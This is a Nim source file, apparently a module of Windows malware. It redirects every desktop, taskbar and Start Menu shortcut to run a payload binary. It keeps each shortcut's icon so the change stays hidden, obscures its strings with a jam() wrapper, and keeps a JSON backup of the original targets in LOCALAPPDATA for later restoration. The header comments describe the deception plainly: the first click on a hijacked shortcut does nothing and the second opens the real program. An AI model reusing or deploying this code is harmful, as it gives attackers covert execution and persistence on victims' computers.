#[
  - Modifies the exec path of all lnk files/shortcuts on the Public desktop, Public start menu,
    User Desktop, and User Taskbar.
  
  - The original paths, modified path, and lnk file name are exported in a .json file to local app data.

  - The user will get no response from attempting to open a program from a shortcut on the first attempt.
    The second attempt their intended program should open.
  
  - The display of the shortcut/lnk file should not change.
]#

import json
import static_strs

import winim/com
from strutils import parseHexInt, endsWith, split
from util import toString, fromString, getFullPath
from os import walkDir, walkDirRec, splitPath, joinPath, removeFile, getEnv, fileExists, `/`

proc parseGuid(guidStr: string): GUID =
  let chunk = guidStr.split("-")
  result.Data1 = cast[int32](parseHexInt(chunk[0]))
  result.Data2 = cast[uint16](parseHexInt(chunk[1]))
  result.Data3 = cast[uint16](parseHexInt(chunk[2]))
  for i in 0 ..< 2:
    result.Data4[i] = cast[uint8](parseHexInt(chunk[3][i*2 ..< i*2+2]))
  for i in 0 ..< 6:
    result.Data4[i+2] = cast[uint8](parseHexInt(chunk[4][i*2 ..< i*2+2]))

const
  CLSID_ShellLink* = parseGuid(jam("00021401-0000-0000-C000-000000000046"))
  IID_IShellLink* = parseGuid(jam("000214F9-0000-0000-C000-000000000046"))
  IID_IPersistFile* = parseGuid(jam("0000010b-0000-0000-C000-000000000046"))

type 
  LnkBackup = ref object
    originalPath: string 
    modifiedPath: string 
    lnkPath: string

let 
  localAppData: string = jam("LOCALAPPDATA")
  backupsPath: string = getEnv(localAppData) / jam("sc_backups.json")

proc toJson(backup: LnkBackup): JsonNode = 
  result = %*{
    "originalPath": %backup.originalPath,
    "modifiedPath": %backup.modifiedPath, 
    "lnkPath": %backup.lnkPath
  }

proc fromJson(json: JsonNode): LnkBackup =
  result = LnkBackup(
    originalPath: json["originalPath"].getStr,
    modifiedPath: json["modifiedPath"].getStr,
    lnkPath: json["lnkPath"].getStr,
  )

proc saveBackup(backupList: seq[LnkBackup]) =
  var data: seq[JsonNode] = @[]
  for backup in backupList:
    data.add(backup.toJson())
  let jsonStr = %data
  writeFile(backupsPath, jsonStr.pretty())

proc loadBackupList(): seq[LnkBackup] =
  if fileExists(backupsPath):
    let data = readFile(backupsPath)
    let parsedJson = parseJson(data)
    var backupList: seq[LnkBackup] = @[]
    for item in parsedJson:
      let backup = fromJson(item)
      backupList.add(backup)
    return backupList
  return @[]

proc findIco(startPath: string): array[260, WCHAR] = 
  let baseDir = splitPath(startPath).head
  var icoPath: string
  proc searchDir(dir: string) =
    for file in walkDirRec(dir):
      if file.endsWith(jam(".ico")):
        icoPath = file 
        break 

    if icoPath.len == 0:
      for subdir in walkDirRec(dir):
        if icoPath.len > 0:
          break 
        searchDir(subDir)
    
  searchDir(baseDir)
  return icoPath.fromString

# Target: shortcut file, gets modified to the path of the payload
#[ 
  - If an ico location is not found, the the ico path is set to the original target path to avoid the 
    shortcut/lnk file from changing appearence, as some lnks icons are set as the binary itself.
]#
proc modifyLnk(target: string, binaryPath: string, backupList: var seq[LnkBackup]): void = 
  var
    ppv: LPVOID 
    ppvPF: LPVOID 
    psl: ptr IShellLinkW 
    ppf: ptr IPersistFile
    currentTarget: array[260, WCHAR]
    icoPath: array[260, WCHAR]
    icoIdx: int32

  if not CoCreateInstance(
    addr CLSID_ShellLink, NULL, DWORD(CLSCTX_INPROC_SERVER), addr IID_IShellLink, addr ppv
  ).SUCCEEDED: return 

  psl = cast[ptr IShellLinkW](ppv)
  defer: discard psl.lpVtbl.Release(psl)

  if not psl.lpVtbl.QueryInterface(psl, addr IID_IPersistFile, addr ppvPF).SUCCEEDED: return
  ppf = cast[ptr IPersistFile](ppvPF)
  defer: discard ppf.lpVtbl.Release(ppf)

  if not ppf.lpVtbl.Load(ppf, target.cstring, STGM_READWRITE).SUCCEEDED: return 
  if not psl.lpVtbl.GetPath(psl, addr currentTarget[0], 260, NULL, SLGP_UNCPRIORITY).SUCCEEDED: return

  if not psl.lpVtbl.GetIconLocation(psl, cast[LPCWSTR](icoPath.addr), cast[int32](260), addr icoIdx).SUCCEEDED: return 
  if icoPath.toString == nil:
    if not psl.lpVtbl.SetIconLocation(psl, cast[LPCWSTR](currentTarget.addr), icoIdx).SUCCEEDED: return
    
  #let newIco: string = findIco(currentTarget.toString)
  #let wNewIco: newIco.fromString 
  #if not psl.lpVtbl.SetIconLocation(psl, cast[LPCWSTR](wNewIco.addr), icoIdx).SUCCEEDED: return

  let originalPath = currentTarget.toString 
  backupList.add(LnkBackup(originalPath: originalPath, modifiedPath: binaryPath, lnkPath: target))

  if not psl.lpVtbl.SetPath(psl, binaryPath.cstring).SUCCEEDED: return
  if not ppf.lpVtbl.Save(ppf, target.cstring, TRUE).SUCCEEDED: return 

# Target: shortcut file, gets restored to it's original path 
proc restoreLnk(target: string, originalPath: string): void = 
  if not fileExists(target): return 
  
  var 
    ppv: LPVOID 
    ppvPF: LPVOID 
    psl: ptr IShellLinkW 
    ppf: ptr IPersistFile 

  if not CoCreateInstance(
    addr CLSID_ShellLink, NULL, DWORD(CLSCTX_INPROC_SERVER), addr IID_IShellLink, addr ppv
  ).SUCCEEDED: return 

  psl = cast[ptr IShellLinkW](ppv)
  defer: discard psl.lpVtbl.Release(psl)

  if not psl.lpVtbl.QueryInterface(psl, addr IID_IPersistFile, addr ppvPF).SUCCEEDED: return 

  ppf = cast[ptr IPersistFile](ppvPF)
  defer: discard ppf.lpVtbl.Release(ppf)

  if not ppf.lpVtbl.Load(ppf, target.cstring, STGM_READWRITE).SUCCEEDED: return 
  if not psl.lpVtbl.SetPath(psl, originalPath.cstring).SUCCEEDED: return 
  if not ppf.lpVtbl.Save(ppf, target.cstring, TRUE).SUCCEEDED: return

proc modifyAllLnkPaths*(binaryPath: string): void =
  var hres: HRESULT = CoInitialize(nil)
  defer: CoUninitialize()

  var backupList: seq[LnkBackup] = @[]
  let 
    userProfile: string = jam("USERPROFILE")
    appData: string = jam("APPDATA")

  for entry in walkDir(getEnv(userProfile) / jam("Desktop")):
    let filePath = entry.path 
    if filePath.endsWith(jam(".lnk")):
      modifyLnk(filePath, binaryPath, backupList)
  
  for entry in walkDir(jam("C:\\Users\\Public\\Desktop")):
    let filePath = entry.path 
    if filePath.endsWith(jam(".lnk")):
      modifyLnk(filePath, binaryPath, backupList)

  for entry in walkDir(getEnv(appData) / jam("Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar")):
    let filePath = entry.path 
    if filePath.endsWith(jam(".lnk")):
      modifyLnk(filePath, binaryPath, backupList)
  
  for filePath in walkDirRec(jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu")):
    let (parent, fileName) = splitPath(filePath)
    if parent == jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"):
      continue
    if fileName.endsWith(jam(".lnk")):
      modifyLnk(filePath, binaryPath, backupList)

  saveBackup(backupList)

proc restoreOrigLnkPaths*(): void =
  var hres: HRESULT = CoInitialize(nil)
  defer: CoUninitialize()

  let backups = loadBackupList()
  let 
    userProfile: string = jam("USERPROFILE")
    appData: string = jam("APPDATA")
  
  for entry in walkDir(getEnv(userProfile) / jam("Desktop")):
    let filePath = entry.path 
    if filePath.endsWith(jam(".lnk")):
      for backup in backups:
        if filePath == backup.lnkPath:
          restoreLnk(filePath, backup.originalPath)

  for entry in walkDir(jam("C:\\Users\\Public\\Desktop")):
    let filePath = entry.path 
    if filePath.endsWith(jam(".lnk")):
      for backup in backups:
        if filePath == backup.lnkPath:
          restoreLnk(filePath, backup.originalPath)
  
  for entry in walkDir(getEnv(appData) / jam("Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar")):
    let filePath = entry.path 
    if filePath.endsWith(jam(".lnk")):
      for backup in backups:
        if filePath == backup.lnkPath:
          restoreLnk(filePath, backup.originalPath)

  for filePath in walkDirRec(jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu")):
    let (parent, fileName) = splitPath(filePath)
    if parent == jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"):
      continue
    if fileName.endsWith(jam(".lnk")):
      for backup in backups:
        if filePath == backup.lnkPath:
          restoreLnk(filePath, backup.originalPath)

  removeFile(backupsPath)





